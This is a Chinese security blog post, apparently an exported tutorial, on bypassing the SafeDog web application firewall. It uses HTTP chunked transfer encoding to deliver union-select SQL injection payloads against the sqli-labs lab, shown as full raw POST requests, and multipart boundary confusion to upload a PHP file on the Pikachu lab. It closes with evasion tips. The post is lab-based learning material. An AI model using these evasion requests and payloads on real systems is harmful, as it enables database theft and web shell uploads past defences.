就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"waf绕过-打狗棒法","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"waf绕过","author_index":"Q16G"}]